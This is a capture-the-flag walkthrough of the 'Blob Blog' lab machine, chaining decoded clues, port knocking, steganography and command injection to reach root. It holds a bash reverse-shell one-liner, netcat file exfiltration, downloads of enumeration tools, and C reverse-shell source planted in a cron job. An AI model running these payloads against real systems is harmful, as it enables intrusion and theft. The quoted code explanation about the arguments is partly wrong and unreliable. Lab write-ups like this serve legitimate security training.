# The Blob Blog - Medium

* Add ```blob.thm``` to ```/etc/hosts``` and start the scan - ```nmap -T4 -p- -A -Pn -v blob.thm```:

  * 22/tcp - ssh - OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
  * 80/tcp - http - Apache httpd 2.4.7 ((Ubuntu))

* On port 80, we see the default landing page for Apache.

* If we view page source for this, we get a base64-encoded snippet; at the end of the source code, we have a note commented out - this mentions 'Bob' and an encoded password 'HcfP8J54AK4'

* The base64-encoded snippet, when decoded, gives us another encoded string - this one only includes characters '+', '[', ']', '-', '<', '>' and '.'

* Using online cipher identifier tools, we can see that this is written in Brainfuck, and we can decode this using other online tools - this gives us the following message:

  ```text
  When I was a kid, my friends and I would always knock on 3 of our neighbors doors.  Always houses 1, then 3, then 5!
  ```

* The above message could be hinting towards either a certain sequence or odd numbers - we would need to keep this in mind

* In the background, we can do some web enumeration:

  ```sh
  gobuster dir -u http://blob.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg -t 25
  # directory scanning

  ffuf -c -u "http://blob.thm" -H "Host: FUZZ.blob.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25
  # subdomain enumeration

  ffuf -c -u "http://blob.thm" -H "Host: FUZZ.blob.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 13312 -s
  # filtering false positives

  gobuster vhost -u http://blob.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
  # vhost enumeration
  ```

* We do not get anything from directory scanning; so I tried decoding the encoded password with every possible cipher on [CyberChef](https://gchq.github.io/CyberChef/)

* When we decode "HcfP8J54AK4" from base58, we get the string "cUpC4k3s" - we can try logging in with SSH using this but it does not work

* Going back to the previous clue, it mentions 'knock' as well - this could refer to [port knocking](https://d00mfist.gitbooks.io/ctf/content/port_knocking.html). We can try this:

  ```sh
  apt install knockd

  knock blob.thm 1 3 5
  # no response
  # we can try nmap scan again to see if there is any change in ports

  nmap -T4 -p- -A -Pn -v blob.thm
  # this gives more open ports now
  ```

* After running ```knock```, we get more open ports:

  * 21/tcp - ftp - vsftpd 3.0.2
  * 445/tcp - http - Apache httpd 2.4.7 ((Ubuntu))
  * 5355/tcp - llmnr
  * 8080/tcp - http - Werkzeug httpd 1.0.1 (Python 3.5.3)

* We can try FTP enumeration:

  ```sh
  ftp blob.thm
  # anonymous login does not work

  # we can try using "cUpC4k3s" as password for 'bob'
  # this works

  ls -la
  # we have several files and a directory

  # fetch all files
  wget -m --no-passive ftp://bob:cUpC4k3s@blob.thm

  # we can go through all the files now
  ```

* From FTP, the only interesting file is 'cool.jpeg' - this image could contain hidden clues, we can check this again after enumerating other services first

* On port 445 too there is a default landing page, and similar to the page on port 80, the comments in source code mentions "p@55w0rd"

* We can try using this as the password for the image found earlier:

  ```sh
  steghide info cool.jpeg
  # use password

  # we have a file that can be extracted
  steghide extract -sf cool.jpeg

  cat out.txt
  ```

* From the file found in the image, we get the creds "zcv:p1fd3v3amT@55n0pr" and a directory '/bobs_safe_for_stuff'

* We can do web enumeration for port 445 as well:

  ```sh
  gobuster dir -u http://blob.thm:445 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg -t 25
  # directory scanning

  ffuf -c -u "http://blob.thm:445" -H "Host: FUZZ.blob.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25
  # subdomain enumeration

  ffuf -c -u "http://blob.thm:445" -H "Host: FUZZ.blob.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 11596 -s
  # filtering false positives

  gobuster vhost -u http://blob.thm:445 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
  # vhost enumeration
  ```

* Directory scanning on port 445 gives us the directory /user. Navigating to this page, we get a SSH key - this can be saved as 'id_rsa' for now, as this could be Bob's private key:

  ```sh
  # after downloading the key
  chmod 600 id_rsa

  ssh bob@blob.thm -i id_rsa
  # this says 'invalid format'
  ```

* Checking the SSH key again, we can see the first row does not contain all the characters completely - something is missing, so we will revisit this

* When we try visiting the directory '/bobs_safe_for_stuff' on port 445, we get another note for bob - it contains a password 'youmayenter'

* On port 8080 also we have a default landing page; the source code does not include anything, so we will have to enumerate:

  ```sh
  gobuster dir -u http://blob.thm:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg -t 25
  # directory scanning
  ```

* Directory scanning on port 8080 gives us the following:

  * /blog
  * /login
  * /review
  * /blog1
  * /blog2
  * /blog3

* All pages lead to /login, which consists of username and password fields

* Trying "zcv:p1fd3v3amT@55n0pr" or "bob:youmayenter" does not work here

* Checking the FTP login, it seems we do not have any user named 'zcv', so this could be another encoded string. Assuming 'zcv' refers to 'bob', this could be a Vigenere cipher, and we can use online tools to decode it

* Using CyberChef again, we can use Vigenere decode with the key 'youmayenter' - this gives us the cleartext creds "bob:d1ff3r3ntP@55w0rd"

* Using these creds, we are able to log into /login on port 8080.

* The /blog page contains links to 6 blog posts, a review and a form to submit our review

* The posts and review do not contain anything interesting; however we can check how the input is handled in the review form

* We can intercept a POST request and check - whatever input is submitted in the review in /blog, it is reflected in /review

* We can test some common payloads into this input form since the text is getting rendered as it is in /review

* When we use Linux RCE payloads like ```id``` or ```whoami```, we can see the commands' output in /review - this means we do have RCE

* We can get a reverse shell by using the payload ```sh -i >& /dev/tcp/10.10.67.222/4444 0>&1```, setting up a listener using ```nc -nvlp 4444``` and refreshing /review:

  ```sh
  # setup a stable shell
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  export TERM=xterm
  # Ctrl+Z now
  stty raw -echo; fg
  # press Enter key twice

  pwd
  # /var/www/html2

  ls -la
  # we can go through the files here
  # nothing interesting

  cd ..

  ls -la
  # in /var/www/, we have a couple of images
  # we can transfer these images to attacker machine

  # in attacker machine
  nc -nvlp 5555 > reno.jpg

  # in reverse shell
  which nc

  /bin/nc 10.10.67.222 5555 -w 3 < reno.jpg

  # similarly for the other image
  # in attacker machine
  nc -nvlp 5555 > reno2.jpg

  # in reverse shell
  /bin/nc 10.10.67.222 5555 -w 3 < reno2.jpg

  # in between, we get an automated message in shell
  # referring to the box not being rooted yet
  # this could be a process or cron job running somewhere

  ls -la /home

  # we have bob and bobloblaw here
  
  ls -la /home/bob
  # this is the ftp share

  ls -la /home/bobloblaw
  # access denied

  # we can check with linpeas for enumeration
  # host linpeas.sh on attacker machine

  # in reverse shell
  wget http://10.10.67.222:8000/linpeas.sh

  chmod +x linpeas.sh

  ./linpeas.sh
  ```

* From the output of 'linpeas.sh', everything seems usual. However, under interesting files section, for the files with SUID bit set, we have an app ```/usr/bin/blogFeedback```:

  ```sh
  ls -la /usr/bin/blogFeedback
  # this is written by user bobloblaw

  /usr/bin/blogFeedback
  # this just prints 'Order my blogs!'

  # we can inspect this binary further
  # transfer to attacker machine

  # on attacker machine
  nc -nvlp 5555 > blogFeedback

  # in reverse shell
  /bin/nc 10.10.67.222 5555 -w 3 < /usr/bin/blogFeedback

  # in attacker machine
  file blogFeedback
  # ELF 64-bit LSB
  
  # launch ghidra for further analysis
  ghidra
  ```

* In ```ghidra```, when we view the ```main``` function (Symbol Tree > Functions > main), we get the following code:

  ```c
  undefined8 main(int param_1,long param_2)

  {
    int iVar1;
    int local_c;
    
    if ((param_1 < 7) || (7 < param_1)) {
      puts("Order my blogs!");
    }
    else {
      local_c = 1;
      while (local_c < 7) {
        iVar1 = atoi(*(char **)(param_2 + (long)local_c * 8));
        if (iVar1 != 7 - local_c) {
          puts("Hmm... I disagree!");
          return 0;
        }
        local_c = local_c + 1;
      }
      puts("Now that, I can get behind!");
      setreuid(1000,1000);
      system("/bin/sh");
    }
    return 0;
  }
  ```

* We can see the program launches a shell for user-id 1000 (which is bobloblaw) when a certain condition is fulfilled.

* We can try to understand what this program is doing with the help of [ChatGPT](https://chatgpt.com) (I asked ChatGPT to explain the C code):

  * the ```main``` function takes two arguments ```param_1``` & ```param_2```
  * program first check is ```param_1``` is not equal to 7; if it's less than or greater than 7, it prints "Order my blogs!" and exits
  * if ```param_1``` is equal to 7, it enters an ```else``` block
  * inside ```else``` block, ```local_c``` variable is initialized to 1, and there is a ```while``` loop that iterates while ```local_c``` is less than 7
  * with each iteration, ```atoi``` converts value at ```param_2 + (long)local_c * 8``` to an integer
  * this indicates the program expects 6 more command-line arguments after the initial argument
  * it then checks if the converted integer is equal to ```7 - local_c```
  * if the checks pass, it changes the effective user and group ID to 1000, and executes ```/bin/sh```
  * so the first argument needs to be 7, followed by 1 to 6, but in reverse-order

* Following the analysis given by ChatGPT, we can execute the binary in our reverse shell like this:

  ```sh
  /usr/bin/blogFeedback 7 6 5 4 3 2 1

  /usr/bin/blogFeedback 6 5 4 3 2 1
  # this works and we get a shell

  id
  # bobloblaw

  cd /home/bobloblaw

  ls -la
  # enumerate the directories

  cat Documents/user.txt

  # we have a binary here

  # from linpeas, cronjob was also enumerated which mentioned this binary

  cat /etc/crontab
  ```

* Now, the cronjob does mention a wildcard character with ```tar```, but it cannot be exploited since we do not have required permissions for the given hidden directory

* We can check with ```pspy``` for any processes that run regularly to print the message that pops up every minute:

  ```sh
  # on attacker machine, host the file

  # fetch the file in reverse shell
  cd /tmp

  wget http://10.10.67.222:8000/pspy64

  chmod +x pspy64

  ./pspy64
  ```

* ```pspy64``` shows that the following command is run at an interval with the help of ```cron```:

  ```sh
  /bin/sh -c gcc /home/bobloblaw/Documents/.boring_file.c -o /home/bobloblaw/Documents/.also_boring/.still_boring && chmod +x /home/bobloblaw/Documents/.also_boring/.still_boring && /home/bobloblaw/Documents/.also_boring/.still_boring | tee /dev/pts/0 /dev/pts/1 /dev/pts/2 && rm /home/bobloblaw/Documents/.also_boring/.still_boring
  ```

* We can check for this in the reverse shell:

  ```sh
  ls -la /home/bobloblaw/Documents

  cat /home/bobloblaw/Documents/.boring_file.c
  # the program which is compiled

  ls -la /home/bobloblaw/Documents/.also_boring

  ls -la /home/bobloblaw/Documents/.also_boring/.still_boring

  /home/bobloblaw/Documents/.also_boring/.still_boring
  # this prints the message
  ```

* We can replace the original '.boring_file.c' with a reverse-shell written in C:

  ```c
  #include <stdio.h>
  #include <sys/socket.h>
  #include <sys/types.h>
  #include <stdlib.h>
  #include <unistd.h>
  #include <netinet/in.h>
  #include <arpa/inet.h>

  int main(void){
      int port = 4445;
      struct sockaddr_in revsockaddr;

      int sockt = socket(AF_INET, SOCK_STREAM, 0);
      revsockaddr.sin_family = AF_INET;       
      revsockaddr.sin_port = htons(port);
      revsockaddr.sin_addr.s_addr = inet_addr("10.10.67.222");

      connect(sockt, (struct sockaddr *) &revsockaddr, 
      sizeof(revsockaddr));
      dup2(sockt, 0);
      dup2(sockt, 1);
      dup2(sockt, 2);

      char * const argv[] = {"/bin/sh", NULL};
      execve("/bin/sh", argv, NULL);

      return 0;       
  }
  ```

  ```sh
  cd /home/boblaw/Documents

  ls -la

  rm .boring_file.c

  vim .boring_file.c
  # paste the reverse shell code here

  # in attacker machine
  nc -nvlp 4445
  # we get reverse shell as root
  ```
